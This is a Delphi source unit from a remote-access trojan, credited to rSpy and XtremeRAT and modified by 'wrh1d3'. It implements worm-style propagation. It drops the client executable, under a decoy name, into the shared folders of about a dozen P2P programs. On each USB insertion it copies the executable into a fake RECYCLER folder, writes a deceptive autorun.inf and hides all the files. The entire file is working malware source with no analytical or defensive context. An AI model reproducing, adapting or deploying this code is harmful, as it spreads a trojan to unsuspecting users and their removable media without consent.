//P2P spreading from rSpy 
//USB spreading from XtremeRAT
//Modified by wrh1d3

unit UnitSpreading;

interface

uses
  Windows, USB, UnitFunctions, UnitConfiguration, UnitVariables;

procedure USBSpreading;
procedure StartP2PSpreading;

implementation
                   
type
  TMain = class
    FileName: string;
    procedure usbConnect(AObject: TObject; ADriverName: string);
  end;

procedure Shareaza(FilePath: string);
var
  Path: string;
begin
  Path := ReadKeyString(HKEY_CURRENT_USER, 'Software\Shareaza\Shareaza\Downloads', 'CollectionPath', '');
  if Path <> '' then CopyFile(PChar(FilePath), PChar(Path+'\'+_SpreadAs), True);
end;

procedure Emule(FilePath: string);
var
  Path: string;
begin
  Path := MyDocumentsDir;
  if Path <> '' then
  begin
    CopyFile(PChar(FilePath), PChar(Path+'\Downloads\eMule\Incoming\'+_SpreadAs), True);
    CopyFile(PChar(FilePath), PChar(ProgramFilesDir+'\emule\incoming\'+_SpreadAs), True);
  end;
end;
     
procedure Kazaa(FilePath: string);
var
  Path: string;
begin
  Path := ProgramFilesDir;
  if Path <> '' then
  begin
    CopyFile(PChar(FilePath), PChar(Path+'\kazaa\my shared folder\'+_SpreadAs), True);
    CopyFile(PChar(FilePath), PChar(Path+'\kazaa lite\my shared folder\'+_SpreadAs), True);
    CopyFile(PChar(FilePath), PChar(Path+'\kazaa lite k++\my shared folder\'+_SpreadAs), True);
  end;
end;
          
procedure Edonkey2000(FilePath: string);
var
  Path: string;
begin
  Path := ProgramFilesDir;
  if Path <> '' then CopyFile(PChar(FilePath), PChar(Path+'\edonkey2000\incoming\'+_SpreadAs), True);
end;

procedure Icq(FilePath: string);
var
  Path: string;
begin
  Path := ProgramFilesDir;
  if Path <> '' then CopyFile(PChar(FilePath), PChar(Path+'\icq\shared folder\'+_SpreadAs), True);
end;

procedure Grokster(FilePath: string);
var
  Path: string;
begin
  Path := ProgramFilesDir;
  if Path <> '' then CopyFile(PChar(FilePath), PChar(Path+'\grokster\my grokster\'+_SpreadAs), True);
end;

procedure Bearshare(FilePath: string);
var
  Path: string;
begin
  Path := ProgramFilesDir;
  if Path <> '' then CopyFile(PChar(FilePath), PChar(Path+'\bearshare\shared\'+_SpreadAs), True);
end;
        
procedure Morpheus(FilePath: string);
var
  Path: string;
begin
  Path := ProgramFilesDir;
  if Path <> '' then CopyFile(PChar(FilePath), PChar(Path+'\morpheus\my shared folder\'+_SpreadAs), True);
end;

procedure Limewire(FilePath: string);
var
  Path: string;
begin
  Path := ProgramFilesDir;
  if Path <> '' then CopyFile(PChar(FilePath), PChar(Path+'\limewire\shared\'+_SpreadAs), True);
end;

procedure Tesla(FilePath: string);
var
  Path: string;
begin
  Path := ProgramFilesDir;
  if Path <> '' then CopyFile(PChar(FilePath), PChar(Path+'\tesla\files\'+_SpreadAs), True);
end;

procedure Winmx(FilePath: string);
var
  Path: string;
begin
  Path := ProgramFilesDir;
  if Path <> '' then CopyFile(PChar(FilePath), PChar(Path+'\winmx\shared\'+_SpreadAs), True);
end;

procedure P2PSpreading(FilePath: string);
begin
  Winmx(FilePath);
  Limewire(FilePath);
  Shareaza(FilePath);
  Bearshare(FilePath);
  Edonkey2000(FilePath);
  Emule(FilePath);
  Tesla(FilePath);
  Morpheus(FilePath);
  Icq(FilePath);
  Kazaa(FilePath);
  Grokster(FilePath);
end;

procedure StartP2PSpreading;
var
  TmpStr: string;
begin
  TmpStr := _P2PNames;
  while TmpStr <> '' do
  begin
    P2PSpreading(Copy(TmpStr, 1, Pos(',', TmpStr) - 1));
    Delete(TmpStr, 1, Pos(',', TmpStr));
  end;
end;

procedure TMain.usbConnect(AObject: TObject; ADriverName: string);
var
  TmpStr, TmpStr1: string;
  TmpSpreadAs: string;
begin
  TmpStr := ADriverName + 'RECYCLER\S-1-5-21-1482476501-3352491937-682996330-1013\';
  if CreatePath(TmpStr) = False then Exit;

  CopyFile(PChar(ClientPath), PChar(TmpStr + ExtractFileName(ClientPath)), False);
  CopyFile(PChar(ClientPath), PChar(TmpStr + _SpreadAs), False);

  TmpStr1 := '[autorun]' + #13#10 +
             ';open=' + 'RECYCLER\S-1-5-21-1482476501-3352491937-682996330-1013\' + ExtractFileName(ClientPath) + #13#10 +
             'icon=shell32.dll,4' + #13#10 +
             'shellexecute=' + 'RECYCLER\S-1-5-21-1482476501-3352491937-682996330-1013\' + ExtractFileName(ClientPath) + #13#10 +
             'action=Open folder to view files' + #13#10 +
             'shell\Open=Open' + #13#10 +
             'shell\Open\command=' + 'RECYCLER\S-1-5-21-1482476501-3352491937-682996330-1013\' + ExtractFileName(ClientPath) + #13#10 +
             'shell\Open\Default=1';

  MyCreateFile(ADriverName + 'autorun.inf', TmpStr1, Length(TmpStr1));
  HideFilename(ADriverName + 'autorun.inf');
  HideFilename(ADriverName + 'RECYCLER\');
  HideFilename(TmpStr);
  HideFilename(TmpStr + ExtractFileName(ClientPath));
end;

procedure USBSpreading;
var
  Msg: TMsg;
  Main: TMain;      
  USBClass: TUsbClass;
begin
  Main := TMain.Create;
  Main.FileName := ClientPath;
  USBClass := TUsbClass.Create;
  USBClass.OnUsbInsertion := Main.usbConnect;

  while GetMessage(msg, 0, 0, 0) do
  begin
    TranslateMessage(msg);
    DispatchMessage(msg);
  end;

  Main.Free;
end;

end.

